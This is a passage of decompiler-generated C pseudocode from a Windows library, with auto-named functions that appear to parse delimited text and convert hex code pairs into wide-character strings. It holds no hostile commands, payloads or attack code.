  v81 = sub_10046D48(v104, dword_10186F84, *v11, v11[1]);
  v12 = sub_10045454(v7, dword_10186FA4 + v10, v91);
  v79 = sub_10046D48(v104, dword_10186FFC, *v12, v12[1]);
  do
  {
    if ( v82 >= v7 )
      break;
    sub_1004A363(a2);
    if ( (v86 == -1 || v81 == -1) && (v10 == -1 || v79 == -1) )
      break;
    if ( v86 == -1 || (v13 = v81, v81 == -1) )
    {
      if ( v10 == -1 )
        goto LABEL_67;
    }
    else if ( v86 < v10 || v10 == -1 )
    {
      LODWORD(v85) = v76;
      v73 = 1;
      v90 = v86;
      v14 = v86 + dword_10186F44;
      goto LABEL_15;
    }
    v13 = v79;
    if ( v79 == -1 )
    {
LABEL_67:
      v57 = sub_1000E7F7(&v85, 1, 0);
      LOBYTE(v125) = 4;
      v70 = 167;
      sub_10007882((int)v57);
    }
    v90 = v10 - 1;
    LODWORD(v85) = v76;
    v73 = 0;
    v14 = v10 + dword_10186FA4;
LABEL_15:
    v74 = v14;
    v76 = v13;
    v82 = v13 + 1;
    if ( v73 )
    {
      if ( v10 > v86 && v10 < v81 )
      {
        v15 = sub_10045454(v7, v81, &v112);
        v16 = sub_10046D48(v104, dword_10186F98, *v15, v15[1]);
        v10 = v16;
        if ( v79 < v16 )
        {
          v17 = sub_10045454(v7, dword_10186FA4 + v16, &v110);
          v79 = sub_10046D48(v104, dword_10186FFC, *v17, v17[1]);
        }
      }
      v18 = sub_10045454(v7, v82, &v120);
      v86 = sub_10046D48(v104, dword_10186F38, *v18, v18[1]);
      v19 = sub_10045454(v7, dword_10186F44 + v86, &v113);
      v81 = sub_10046D48(v104, dword_10186F84, *v19, v19[1]);
    }
    else
    {
      EndPtr = (char *)(v13 + 1);
      do
      {
        sub_1004A363(a2);
        v20 = sub_10045454(v7, (int)EndPtr, &v107);
        v10 = sub_10046D48(v104, dword_10186F98, *v20, v20[1]);
        EndPtr = (char *)(v10 + 2 * dword_10186FA4);
        if ( v10 == -1
          || (v21 = sub_10045454(v10 + 2 * dword_10186FA4, dword_10186FA4 + v10, &v119),
              v22 = sub_10046723(v104, v121, *v21, v21[1]),
              LOBYTE(v125) = 5,
              v72 |= 1u,
              v23 = sub_1000B4E7(dword_10186F98, v22),
              HIBYTE(v71) = 1,
              !v23) )
        {
          HIBYTE(v71) = 0;
        }
        v125 = 3;
        if ( (v72 & 1) != 0 )
        {
          v72 &= ~1u;
          sub_1000B3DF(v121);
        }
      }
      while ( HIBYTE(v71) );
      v24 = sub_10045454(v7, dword_10186FA4 + v10, &v109);
      v79 = sub_10046D48(v104, dword_10186FFC, *v24, v24[1]);
    }
    v25 = sub_10045454(v74, 0, &v105);
    EndPtr = (char *)sub_10046DF5(v104, dword_10186FE8, *v25, v25[1]);
    v26 = sub_10045454(v74, 0, &v111);
    v27 = sub_10046DF5(v104, dword_10186F70, *v26, v26[1]);
    if ( EndPtr == (char *)-1 || v27 != -1 && v27 > (int)EndPtr )
      continue;
    sub_1000D17D(&Src, &word_1017498C);
    LOBYTE(v125) = 6;
    v28 = v74;
    v29 = sub_10045454(v74, 0, &v114);
    v30 = sub_10046DF5(v104, dword_10186F5C, *v29, v29[1]);
    if ( v30 != -1 )
    {
      v31 = sub_10045454(v30, 0, &v116);
      v32 = sub_10046DF5(v104, dword_10187050, *v31, v31[1]);
      if ( v32 != -1 )
      {
        v33 = sub_10045454(v28, v32, &v117);
        sub_10046450(v104, v123, byte_10130A7B, *v33, v33[1]);
        LOBYTE(v125) = 7;
        v34 = sub_1000D2FA(v95, 0);
        LOBYTE(v125) = 8;
        sub_10001236(v34 + 1, &v84);
        LOBYTE(v125) = 7;
        sub_1000D3AD(v95);
        LOBYTE(v125) = 6;
        sub_1000B3DF(v123);
      }
    }
    sub_1000D17D(&v87, &word_10174990);
    LOBYTE(v125) = 9;
    if ( v73 )
    {
      v35 = sub_10045454(v76, v28, &v115);
      v36 = sub_10046723(v104, v122, *v35, v35[1]);
      LOBYTE(v125) = 10;
      v37 = (LONG *)sub_10048D1C(v36, &Src, a2, v98);
      LOBYTE(v125) = 11;
      sub_10001236(v37 + 1, &v88);
      LOBYTE(v125) = 10;
      sub_1000D3AD(v98);
      LOBYTE(v125) = 9;
      v38 = v122;
    }
    else
    {
      v39 = sub_10045454(v76, v28, &v106);
      v40 = sub_10046723(v104, v124, *v39, v39[1]);
      LOBYTE(v125) = 12;
      v41 = sub_10049085((__int32)v103, a2, v103, v40, &Src);
      LOBYTE(v125) = 13;
      sub_10001236(v41 + 1, &v88);
      LOBYTE(v125) = 12;
      sub_1000D3AD(v103);
      LOBYTE(v125) = 9;
      v38 = v124;
    }
    sub_1000B3DF((int *)v38);
    v42 = sub_10045454(v90, SLODWORD(v85), &v108);
    sub_10046723(v104, v102, *v42, v42[1]);
    LOBYTE(v125) = 14;
    sub_1000D2FA(&v77, 0);
    LOBYTE(v125) = 15;
    v43 = sub_1000DF11(0, (int)&v77, (int)&unk_10187090);
    v85 = 0.0;
    v74 = v43;
    HIBYTE(v71) = 0;
    if ( v43 == -1 )
    {
      v74 = sub_1000DF11(0, (int)&v77, (int)&unk_10187018);
      if ( v74 != -1 )
        goto LABEL_43;
      v74 = sub_1000DF11(0, (int)&v77, (int)&unk_10187078);
    }
    else
    {
      HIBYTE(v71) = 1;
    }
    if ( v74 != -1 )
    {
LABEL_43:
      v44 = sub_1000D836(v74 - 1, (int)&v77, v100, 0);
      LOBYTE(v125) = 16;
      sub_10001236(v44 + 1, &v78);
      LOBYTE(v125) = 15;
      sub_1000D3AD(v100);
      v45 = sub_1000DEE8((int)&v77, 0x20u);
      v46 = sub_1000D836(-2, (int)&v77, v97, v45);
      LOBYTE(v125) = 17;
      v85 = wcstod((const wchar_t *)*(_DWORD *)(v46[1] + 12), 0);
      LOBYTE(v125) = 15;
      v47 = v97;
LABEL_50:
      sub_1000D3AD(v47);
      goto LABEL_51;
    }
    if ( v102[3] )
    {
      EndPtr = 0;
      v48 = (const char *)(sub_1000B4B8(v102) + 1);
      v49 = strtol(v48, &EndPtr, 10);
      if ( EndPtr )
      {
        if ( EndPtr != v48 && v49 && (unsigned int)abs(v49) > 0x64 )
        {
          sub_1000D17D(v92, asc_10174994);
          LOBYTE(v125) = 18;
          v70 = (size_t)v92;
          v50 = (*(int (__thiscall **)(int *, double *))(v93[0] + 16))(v93, &v80);
          v51 = sub_1000D5FF(v101, v50, (_DWORD *)v70);
          LOBYTE(v125) = 19;
          sub_1004AB5D(v93, (int)&v80, (int)v51);
          LOBYTE(v125) = 18;
          sub_1000D3AD(v101);
          LOBYTE(v125) = 15;
          v47 = v92;
          goto LABEL_50;
        }
      }
    }
LABEL_51:
    if ( HIBYTE(v71) )
      v52 = -v85;
    else
      v52 = v80 - v85;
    v80 = v52;
    if ( sub_1004A9F2(v93, &v80) )
    {
      if ( v74 == -1 )
      {
        v53 = sub_1000D17D(v99, &word_1017499C);
        v125 = 21;
        v72 |= 4u;
      }
      else
      {
        v53 = sub_1000D17D(v94, asc_10174998);
        LOBYTE(v125) = 20;
        v72 |= 2u;
      }
      sub_1000D372(v89, (int)v53);
      v125 = 23;
      if ( (v72 & 4) != 0 )
      {
        v72 &= ~4u;
        sub_1000D3AD(v99);
      }
      LOBYTE(v125) = 24;
      if ( (v72 & 2) != 0 )
      {
        v72 &= ~2u;
        sub_1000D3AD(v94);
      }
      v70 = (size_t)v89;
      v54 = (*(int (__thiscall **)(int *, double *))(v93[0] + 16))(v93, &v80);
      v55 = sub_1000D5FF(v91, v54, (_DWORD *)v70);
      LOBYTE(v125) = 25;
      v56 = sub_1000D5FF(v96, (int)v55, &v87);
      LOBYTE(v125) = 26;
      sub_1004AB5D(v93, (int)&v80, (int)v56);
      LOBYTE(v125) = 25;
      sub_1000D3AD(v96);
      LOBYTE(v125) = 24;
      sub_1000D3AD(v91);
      LOBYTE(v125) = 15;
      sub_1000D3AD(v89);
    }
    else
    {
      sub_1004AB5D(v93, (int)&v80, (int)&v87);
    }
    LOBYTE(v125) = 14;
    sub_1000D3AD(&v77);
    LOBYTE(v125) = 9;
    sub_1000B3DF(v102);
    LOBYTE(v125) = 6;
    sub_1000D3AD(&v87);
    LOBYTE(v125) = 3;
    sub_1000D3AD(&Src);
  }
  while ( v82 != -1 );
  sub_1004E6E8((int)v93, (int)&v77);
  LOBYTE(v125) = 27;
  while ( 1 )
  {
    if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v77 + 4))(v77) )
    {
      LOBYTE(v125) = 3;
      sub_10007D7A((void **)&v77);
      LOBYTE(v125) = 2;
      sub_1004A9AF(v93);
      LOBYTE(v125) = 0;
      sub_10036C70((int)v104);
      v125 = -1;
      sub_1001AF12((int)v118);
      return 1;
    }
    sub_1004A363(a2);
    sub_1000D17D(v89, asc_101749A0);
    LOBYTE(v125) = 28;
    v58 = (*(int (__thiscall **)(int))(*(_DWORD *)v77 + 12))(v77);
    sub_1000D5FF(&Src, v58, v89);
    LOBYTE(v125) = 30;
    sub_1000D3AD(v89);
    v59 = sub_1000D687((int)&Src);
    v60 = *a4;
    v61 = a3[3];
    v62 = 2 * v59;
    v63 = *a4 + 2 * v59 + 13;
    HIBYTE(v71) = 0;
    if ( v63 > v61 )
    {
      v62 = v61 - v60 - 13;
      HIBYTE(v71) = 1;
    }
    v64 = *(const void **)(v84 + 12);
    v70 = v62;
    v69 = v64;
    v65 = sub_1000B49B(a3, (int)v64);
    memcpy((void *)(v65 + *a4 + 13), v69, v70);
    *a4 += v62;
    if ( HIBYTE(v71) )
      break;
    LOBYTE(v125) = 27;
    sub_1000D3AD(&Src);
    sub_10021F56(v66, v77);
  }
  LOBYTE(v125) = 27;
  sub_1000D3AD(&Src);
  LOBYTE(v125) = 3;
  sub_10007D7A((void **)&v77);
  LOBYTE(v125) = 2;
  sub_1004A9AF(v93);
  LOBYTE(v125) = 0;
  sub_10036C70((int)v104);
  v125 = -1;
  sub_1001AF12((int)v118);
  return 0;
}
// 10048B0D: variable 'v66' is possibly undefined
// 10130A7B: using guessed type _BYTE byte_10130A7B[119];
// 10186F38: using guessed type _DWORD dword_10186F38[3];
// 10186F44: using guessed type int dword_10186F44;
// 10186F5C: using guessed type _DWORD dword_10186F5C[5];
// 10186F70: using guessed type _DWORD dword_10186F70[5];
// 10186F84: using guessed type _DWORD dword_10186F84[5];
// 10186F98: using guessed type _DWORD dword_10186F98[3];
// 10186FA4: using guessed type int dword_10186FA4;
// 10186FE8: using guessed type _DWORD dword_10186FE8[5];
// 10186FFC: using guessed type _DWORD dword_10186FFC[3];
// 10187050: using guessed type _DWORD dword_10187050[5];
// 10047FB7: using guessed type int var_60[5];
// 10047FB7: using guessed type int var_38[5];
// 10047FB7: using guessed type _DWORD var_1A4[2];

//----- (10048BE6) --------------------------------------------------------
_DWORD *__userpurge sub_10048BE6@<eax>(__int32 a1@<eax>, int a2@<ecx>, _DWORD *a3, void *a4)
{
  int v5; // ecx
  int v6; // eax
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  int v10[5]; // [esp-20h] [ebp-58h] BYREF
  int v11; // [esp-Ch] [ebp-44h] BYREF
  int v12; // [esp-8h] [ebp-40h]
  int v13[4]; // [esp+10h] [ebp-28h] BYREF
  int v14[5]; // [esp+20h] [ebp-18h] BYREF
  int v15; // [esp+34h] [ebp-4h]

  sub_10029BC2(a1);
  if ( !*(_BYTE *)(a2 + 4) )
    sub_10049283(a2);
  *a3 = dword_10186DB0;
  a3[1] = dword_10186DB4;
  if ( (*(unsigned __int8 (__thiscall **)(int, void *))(*(_DWORD *)(a2 + 8) + 8))(a2 + 8, a4) )
  {
    v15 = 1;
    v6 = (*(int (__thiscall **)(int, void *))(*(_DWORD *)(a2 + 8) + 16))(a2 + 8, a4);
    sub_10039511(v13, v6);
    LOBYTE(v15) = 2;
    v7 = (_DWORD *)(*(int (__thiscall **)(int *, _DWORD))(v13[0] + 44))(v13, 0);
    sub_1000B36F(v7, (int)v10);
    LOBYTE(v15) = 2;
    v8 = sub_10046974(a2 + 156, v14, v10[0], v10[1], v10[2], v10[3], v10[4]);
    *a3 = *v8;
    a3[1] = v8[1];
    LOBYTE(v15) = 1;
    sub_10032EA8(v13);
    v15 = -1;
  }
  else
  {
    v12 = v5;
    v11 = v5;
    sub_1000728E(&v11, 0);
    v15 = -1;
    sub_1004F292((_DWORD *)dword_10182DE8, 120, (int)a4, v11, v12);
  }
  return a3;
}
// 10048C28: variable 'v5' is possibly undefined
// 10182DE8: using guessed type int dword_10182DE8;
// 10186DB0: using guessed type int dword_10186DB0;
// 10186DB4: using guessed type int dword_10186DB4;
// 10048BE6: using guessed type int var_18[5];

//----- (10048D1C) --------------------------------------------------------
void *__fastcall sub_10048D1C(_DWORD *a1, void *a2, _DWORD *a3, void *a4)
{
  unsigned int v4; // edi
  _DWORD *v7; // ebx
  _DWORD *v8; // ebx
  _DWORD *v9; // ebx
  wchar_t *v10; // eax
  _DWORD *v11; // eax
  _DWORD *v12; // eax
  _DWORD *v13; // eax
  int v15; // [esp+0h] [ebp-4E88h] BYREF
  int v16[5]; // [esp+10h] [ebp-4E78h] BYREF
  int v17[2]; // [esp+24h] [ebp-4E64h] BYREF
  int v18; // [esp+2Ch] [ebp-4E5Ch]
  int v19[2]; // [esp+30h] [ebp-4E58h] BYREF
  int v20; // [esp+38h] [ebp-4E50h] BYREF
  _DWORD *v21; // [esp+40h] [ebp-4E48h]
  void *v22; // [esp+44h] [ebp-4E44h]
  char v23; // [esp+48h] [ebp-4E40h] BYREF
  char v24; // [esp+49h] [ebp-4E3Fh] BYREF
  char v25; // [esp+4Ah] [ebp-4E3Eh] BYREF
  char v26; // [esp+4Bh] [ebp-4E3Dh] BYREF
  int v27; // [esp+4Ch] [ebp-4E3Ch]
  wchar_t String[10002]; // [esp+50h] [ebp-4E38h] BYREF
  int *v29; // [esp+4E78h] [ebp-10h]
  int v30; // [esp+4E84h] [ebp-4h]

  v29 = &v15;
  v4 = 0;
  v30 = 0;
  v21 = a3;
  v22 = a4;
  v19[1] = (int)a1;
  v27 = (int)a2;
  v18 = 0;
  sub_10029BC2((__int32)a4);
  v30 = 1;
  sub_100492F6(a2, v21);
  v30 = 0;
  sub_1000D17D(v22, &word_101749AC);
  v30 = 0;
  v18 = 1;
  v27 = 0;
  if ( a1[3] )
  {
    do
    {
      v7 = v21;
      sub_1004A363(v21);
      v24 = *(_BYTE *)(a1[2] + *(_DWORD *)(a1[1] + 12) + v4);
      v8 = v7 + 20;
      if ( (*(unsigned __int8 (__thiscall **)(_DWORD *, char *))(*v8 + 8))(v8, &v24) )
      {
        v27 = 0;
        memset(String, 0, 20000);
        while ( v4 < a1[3] )
        {
          v23 = *(_BYTE *)(a1[2] + *(_DWORD *)(a1[1] + 12) + v4);
          v9 = v21 + 20;
          if ( !(*(unsigned __int8 (__thiscall **)(_DWORD *, char *))(v21[20] + 8))(v21 + 20, &v23) )
            break;
          sub_1004A363(v21);
          v25 = *(_BYTE *)(a1[2] + *(_DWORD *)(a1[1] + 12) + v4);
          v10 = (wchar_t *)(*(int (__thiscall **)(_DWORD *, char *))(*v9 + 16))(v9, &v25);
          String[v27++] = *v10;
          if ( v27 == 9999 )
          {
            v11 = sub_1000D17D(&v20, String);
            v30 = 4;
            sub_1000D575((int)v22, v11);
            LOBYTE(v30) = 0;
            sub_1000D3AD(&v20);
            memset(String, 0, 0x2710u);
            v27 = 0;
          }
          ++v4;
        }
        v12 = sub_1000D17D(v19, String);
        v30 = 5;
        sub_1000D575((int)v22, v12);
        LOBYTE(v30) = 0;
        sub_1000D3AD(v19);
      }
      else
      {
        while ( v4 < a1[3] )
        {
          v26 = *(_BYTE *)(a1[2] + *(_DWORD *)(a1[1] + 12) + v4);
          if ( (*(unsigned __int8 (__thiscall **)(_DWORD *, char *))(*v8 + 8))(v8, &v26) )
            break;
          ++v4;
        }
        sub_1000B67C(a1, (int)v16, v27, v4 - v27);
        v30 = 6;
        v13 = sub_1000D2FA(v17, 0);
        LOBYTE(v30) = 7;
        sub_1000D575((int)v22, v13);
        LOBYTE(v30) = 6;
        sub_1000D3AD(v17);
        LOBYTE(v30) = 0;
        sub_1000B3DF(v16);
      }
      v27 = v4;
    }
    while ( v4 < a1[3] );
  }
  sub_1000D17D(&v20, &word_101749B4);
  v30 = 8;
  sub_1000D9E4((int)&v20, dword_10193954, (LONG *)v22, 0);
  LOBYTE(v30) = 0;
  sub_1000D3AD(&v20);
  return v22;
}
// 10182DE8: using guessed type int dword_10182DE8;
// 10193954: using guessed type _DWORD dword_10193954[2];
// 10048D1C: using guessed type int var_4E78[5];

//----- (10049085) --------------------------------------------------------
_DWORD *__userpurge sub_10049085@<eax>(__int32 a1@<eax>, _DWORD *a2, _DWORD *a3, _DWORD *a4, void *Src)
{
  LONG *v5; // eax
  LONG *v6; // eax
  _DWORD *v7; // edi
  int v8; // eax
  unsigned int j; // edi
  char v10; // bl
  char v11; // al
  void *v12; // ebx
  size_t v13; // eax
  int v15[5]; // [esp+10h] [ebp-58h] BYREF
  int v16[2]; // [esp+24h] [ebp-44h] BYREF
  int v17[2]; // [esp+2Ch] [ebp-3Ch] BYREF
  int v18[2]; // [esp+34h] [ebp-34h] BYREF
  int v19[2]; // [esp+3Ch] [ebp-2Ch] BYREF
  int v20; // [esp+44h] [ebp-24h] BYREF
  LONG v21[2]; // [esp+48h] [ebp-20h] BYREF
  void *i; // [esp+50h] [ebp-18h]
  int v23; // [esp+64h] [ebp-4h]

  sub_10029BC2(a1);
  sub_100498D6(Src, a2);
  sub_1000D17D(a3, &word_101749B0);
  v23 = 0;
  v21[1] = 1;
  for ( i = 0; (unsigned int)i < a4[3]; i = (char *)i + 4 )
  {
    sub_1004A363(a2);
    sub_1000B67C(a4, (int)v15, (int)i, 4);
    v23 = 4;
    v5 = sub_1000D2FA(v16, 0);
    LOBYTE(v23) = 5;
    v6 = sub_1000D984(v5);
    sub_1000D372(&v20, (int)v6);
    LOBYTE(v23) = 7;
    sub_1000D3AD(v16);
    LOBYTE(v23) = 8;
    sub_1000B3DF(v15);
    v7 = a2 + 11;
    if ( (*(unsigned __int8 (__thiscall **)(_DWORD *, int *))(*v7 + 8))(v7, &v20) )
    {
      v8 = (*(int (__thiscall **)(_DWORD *, int *))(*v7 + 16))(v7, &v20);
      sub_10001236((LONG *)(v8 + 4), v21);
    }
    sub_1000D1D6(v19, 1u);
    LOBYTE(v23) = 9;
    for ( j = 0; j < *(_DWORD *)(v21[0] + 28); j += 4 )
    {
      sub_1000D836(2, (int)&v20, v17, j + 2);
      LOBYTE(v23) = 10;
      sub_1000D836(2, (int)&v20, v18, j);
      LOBYTE(v23) = 11;
      v10 = sub_1000D80E((int)v17);
      v11 = sub_1000D80E((int)v18);
      LOBYTE(Src) = v10;
      BYTE1(Src) = v11;
      sub_1000D4A1(v19);
      v12 = *(void **)(v19[1] + 12);
      v13 = sub_1000D687((int)v19);
      memcpy(v12, &Src, 2 * v13);
      sub_1000D575((int)a3, v19);
      LOBYTE(v23) = 10;
      sub_1000D3AD(v18);
      LOBYTE(v23) = 9;
      sub_1000D3AD(v17);
    }
    LOBYTE(v23) = 8;
    sub_1000D3AD(v19);
    LOBYTE(v23) = 0;
    sub_1000D3AD(&v20);
  }
  return a3;
}
// 10182DE8: using guessed type int dword_10182DE8;
// 10049085: using guessed type int var_58[5];

//----- (10049283) --------------------------------------------------------
int __stdcall sub_10049283(int a1)
{
  int result; // eax

  result = sub_10045B62((_DWORD *)(a1 + 156), a1 + 8);
  *(_BYTE *)(a1 + 4) = 1;
  return result;
}
// 10182DE8: using guessed type int dword_10182DE8;

//----- (100492F6) --------------------------------------------------------
void __thiscall sub_100492F6(void *this, _DWORD *a2)
{
  _DWORD *v3; // esi
  _DWORD *v4; // eax
  int v5; // esi
  _DWORD *v6; // ebx
  int v7; // eax
  int v8; // esi
  int *v9; // eax
  _DWORD *v10; // eax
  _DWORD *v11; // eax
  _DWORD *v12; // esi
  int v13; // eax
  int v14; // eax
  int v15; // edi
  int *v16; // eax
  _DWORD *v17; // eax
  bool v18; // bl
  void *v19; // ebx
  int *v20; // eax
  _DWORD *v21; // eax
  int *v22; // eax
  _DWORD *v23; // eax
  _DWORD *v24; // eax
  char *v25; // ecx
  int *v26; // eax
  _DWORD *v27; // eax
  _DWORD *v28; // eax
  _DWORD *v29; // esi
  int *v30; // eax
  _DWORD *v31; // eax
  int *v32; // eax
  _DWORD *v33; // eax
  _DWORD *v34; // eax
  char *v35; // ecx
  int *v36; // eax
  _DWORD *v37; // eax
  int v38[12]; // [esp-20h] [ebp-17Ch] BYREF
  char v39[20]; // [esp+10h] [ebp-14Ch] BYREF
  char v40[20]; // [esp+24h] [ebp-138h] BYREF
  char v41[20]; // [esp+38h] [ebp-124h] BYREF
  char v42[20]; // [esp+4Ch] [ebp-110h] BYREF
  int v43[5]; // [esp+60h] [ebp-FCh] BYREF
  int v44[5]; // [esp+74h] [ebp-E8h] BYREF
  int v45; // [esp+88h] [ebp-D4h] BYREF
  int v46; // [esp+90h] [ebp-CCh] BYREF
  int v47; // [esp+98h] [ebp-C4h] BYREF
  int v48; // [esp+A0h] [ebp-BCh] BYREF
  int v49; // [esp+A8h] [ebp-B4h] BYREF
  int v50; // [esp+B0h] [ebp-ACh] BYREF
  int v51; // [esp+B8h] [ebp-A4h] BYREF
  _DWORD v52[4]; // [esp+C0h] [ebp-9Ch] BYREF
  int v53[5]; // [esp+D0h] [ebp-8Ch] BYREF
  int v54[2]; // [esp+E4h] [ebp-78h] BYREF
  int v55[2]; // [esp+ECh] [ebp-70h] BYREF
  int v56[2]; // [esp+F4h] [ebp-68h] BYREF
  int v57[2]; // [esp+FCh] [ebp-60h] BYREF
  int v58[2]; // [esp+104h] [ebp-58h] BYREF
  int v59[2]; // [esp+10Ch] [ebp-50h] BYREF
  int v60[2]; // [esp+114h] [ebp-48h] BYREF
  unsigned int v61; // [esp+120h] [ebp-3Ch] BYREF
  unsigned int v62; // [esp+124h] [ebp-38h]
  int v63; // [esp+128h] [ebp-34h] BYREF
  int v64; // [esp+12Ch] [ebp-30h]
  void *v65; // [esp+130h] [ebp-2Ch]
  void *v66; // [esp+134h] [ebp-28h] BYREF
  int v67; // [esp+138h] [ebp-24h]
  int v68; // [esp+13Ch] [ebp-20h]
  int v69; // [esp+140h] [ebp-1Ch] BYREF
  LONG v70; // [esp+144h] [ebp-18h] BYREF
  char v71; // [esp+14Ah] [ebp-12h] BYREF
  bool v72; // [esp+14Bh] [ebp-11h]
  int v73; // [esp+158h] [ebp-4h]

  v3 = a2 + 2;
  if ( (*(unsigned __int8 (__thiscall **)(_DWORD *, void *))(a2[2] + 8))(a2 + 2, this) )
  {
    if ( *(_BYTE *)((*(int (__thiscall **)(_DWORD *, void *))(*v3 + 16))(v3, this) + 16) )
      return;
    *(_BYTE *)((*(int (__thiscall **)(_DWORD *, void *))(*v3 + 16))(v3, this) + 16) = 1;
  }
  v4 = sub_10048BE6((__int32)&v66, (int)a2, &v66, this);
  v5 = (int)v66;
  if ( (void *)dword_10186DB0 != v66 || (v4 = (_DWORD *)dword_10186DB4, dword_10186DB4 != v67) )
  {
    sub_10029BC2((__int32)v4);
    v6 = a2 + 39;
    v7 = sub_10046B33(dword_10186FD4, a2 + 39, v5, v67);
    if ( v7 != -1 )
    {
      v8 = sub_1004624E(v6, v7 + dword_10186FE0);
      v9 = sub_10045454(v8 + 1, v8, v60);
      v10 = sub_10046723(v6, v53, *v9, v9[1]);
      v73 = 0;
      v72 = sub_1000B4E7(v10, dword_10187050);
      v73 = -1;
      sub_1000B3DF(v53);
      if ( !v72 )
      {
        sub_1004664E(v6, v52, v8);
        v73 = 1;
        sub_10037CF0(v52, (int)&v66);
        LOBYTE(v73) = 2;
        while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v66 + 4))(v66) )
        {
          sub_1004A363(a2);
          LOBYTE(v73) = 3;
          v11 = (_DWORD *)(*(int (__thiscall **)(void *))(*(_DWORD *)v66 + 12))(v66);
          v65 = v38;
          sub_1000B36F(v11, (int)v38);
          v12 = a2 + 39;
          LOBYTE(v73) = 3;
          sub_10046974((int)(a2 + 39), &v63, v38[0], v38[1], v38[2], v38[3], v38[4]);
          v13 = sub_10046B33(dword_1019395C, a2 + 39, v63, v64);
          if ( v13 == -1 )
            goto LABEL_11;
          v14 = sub_1004624E(v12, v13 + dword_10193968);
          v15 = v14 + 1;
          v16 = sub_10045454(v14 + 1, v14, &v48);
          v17 = sub_10046723(v12, v53, *v16, v16[1]);
          LOBYTE(v73) = 5;
          v18 = !sub_1000B4E7(v17, dword_10186FC0);
          LOBYTE(v73) = 3;
          sub_1000B3DF(v53);
          if ( v18 )
          {
LABEL_11:
            LOBYTE(v73) = 2;
          }
          else
          {
            v19 = (void *)sub_1004624E(v12, v15);
            v65 = v19;
            sub_1000D17D(&v69, &word_101749B8);
            LOBYTE(v73) = 6;
            v20 = sub_10045454((int)v19 + 1, (int)v19, &v47);
            v21 = sub_10046723(v12, v44, *v20, v20[1]);
            LOBYTE(v73) = 7;
            v72 = sub_1000B4E7(dword_10187050, v21);
            LOBYTE(v73) = 6;
            sub_1000B3DF(v44);
            if ( v72 )
            {
              v22 = sub_10045454(v64, (int)v19 + 1, &v50);
              sub_10046450(v12, v42, asc_101749BC, *v22, v22[1]);
              LOBYTE(v73) = 8;
              v23 = sub_1000D2FA(v54, 0);
              LOBYTE(v73) = 9;
              v24 = sub_1000D5FF(v58, (int)&unk_10187098, v23);
              LOBYTE(v73) = 10;
              sub_10001236(v24 + 1, &v70);
              LOBYTE(v73) = 9;
              sub_1000D3AD(v58);
              LOBYTE(v73) = 8;
              sub_1000D3AD(v54);
              LOBYTE(v73) = 6;
              v25 = v42;
            }
            else
            {
              v26 = sub_10045454(v64, (int)v19, &v45);
              sub_10046450(v12, v40, asc_101749C0, *v26, v26[1]);
              LOBYTE(v73) = 11;
              v27 = sub_1000D2FA(v55, 0);
              LOBYTE(v73) = 12;
              sub_10001236(v27 + 1, &v70);
              LOBYTE(v73) = 11;
              sub_1000D3AD(v55);
              LOBYTE(v73) = 6;
              v25 = v40;
            }
            sub_1000B3DF((int *)v25);
            v62 = 0;
            v68 = 0;
            while ( *(_DWORD *)(v70 + 28) )
            {
              if ( sub_1000E007((int)&v69, (int)&unk_10187098) )
              {
                LOBYTE(v73) = 13;
                v71 = v62 + v68;
                v28 = sub_1000D836(-2, (int)&v69, v56, *(_DWORD *)(dword_1018709C + 28));
                LOBYTE(v73) = 14;
                v61 = sub_1004A152((int)v28);
                LOBYTE(v73) = 13;
                sub_1000D3AD(v56);
                (*(void (__thiscall **)(_DWORD *, char *, unsigned int *))(a2[20] + 24))(a2 + 20, &v71, &v61);
                v73 = 6;
                ++v68;
              }
              else
              {
                v62 = sub_1000D822((int)&v69);
                v68 = 0;
              }
              v29 = a2 + 39;
              v19 = (void *)sub_1004624E(a2 + 39, (int)v19 + *(_DWORD *)(v70 + 28));
              v65 = v19;
              v30 = sub_10045454((int)v19 + 1, (int)v19, &v51);
              v31 = sub_10046723(a2 + 39, v43, *v30, v30[1]);
              LOBYTE(v73) = 17;
              v72 = sub_1000B4E7(dword_10187050, v31);
              LOBYTE(v73) = 6;
              sub_1000B3DF(v43);
              if ( v72 )
              {
                v32 = sub_10045454(v64, (int)v19 + 1, &v46);
                sub_10046450(v29, v41, asc_101749C4, *v32, v32[1]);
                LOBYTE(v73) = 18;
                v33 = sub_1000D2FA(v59, 0);
                LOBYTE(v73) = 19;
                v34 = sub_1000D5FF(v57, (int)&unk_10187098, v33);
                LOBYTE(v73) = 20;
                sub_10001236(v34 + 1, &v70);
                LOBYTE(v73) = 19;
                sub_1000D3AD(v57);
                LOBYTE(v73) = 18;
                sub_1000D3AD(v59);
                LOBYTE(v73) = 6;
                v35 = v41;
              }
              else
              {
                v36 = sub_10045454(v64, (int)v19, &v49);
                sub_10046450(v29, v39, asc_101749C8, *v36, v36[1]);
                LOBYTE(v73) = 21;
                v37 = sub_1000D2FA(v60, 0);
                LOBYTE(v73) = 22;
                sub_10001236(v37 + 1, &v70);
                LOBYTE(v73) = 21;
                sub_1000D3AD(v60);
                LOBYTE(v73) = 6;
                v35 = v39;
              }
              sub_1000B3DF((int *)v35);
            }
            LOBYTE(v73) = 3;
            sub_1000D3AD(&v69);
            v73 = 2;
          }
          sub_10042AAB((int)v66);
        }
        LOBYTE(v73) = 1;
        sub_1003406C(&v66);
        v73 = -1;
        sub_10032EA8(v52);
      }
    }
  }
}
// 10182DE8: using guessed type int dword_10182DE8;
// 10186DB0: using guessed type int dword_10186DB0;
// 10186DB4: using guessed type int dword_10186DB4;
// 10186FC0: using guessed type _DWORD dword_10186FC0[3];
// 10186FD4: using guessed type _DWORD dword_10186FD4[3];
// 10186FE0: using guessed type int dword_10186FE0;
// 10187050: using guessed type _DWORD dword_10187050[5];
// 1018709C: using guessed type int dword_1018709C;
// 1019395C: using guessed type _DWORD dword_1019395C[3];
// 10193968: using guessed type int dword_10193968;
// 100492F6: using guessed type int var_8C[5];
// 100492F6: using guessed type _DWORD var_9C[4];
// 100492F6: using guessed type int var_E8[5];
// 100492F6: using guessed type LONG var_18;
// 100492F6: using guessed type int var_FC[5];

//----- (100498D6) --------------------------------------------------------
void __usercall sub_100498D6(void *a1@<ecx>, _DWORD *a2@<edi>)
{
  _DWORD *v3; // esi
  int v4; // eax
  int v5; // eax
  _DWORD *v6; // eax
  _DWORD v7[4]; // [esp+10h] [ebp-38h] BYREF
  _DWORD v8[4]; // [esp+20h] [ebp-28h] BYREF
  void *v9; // [esp+30h] [ebp-18h] BYREF
  int v10; // [esp+34h] [ebp-14h]
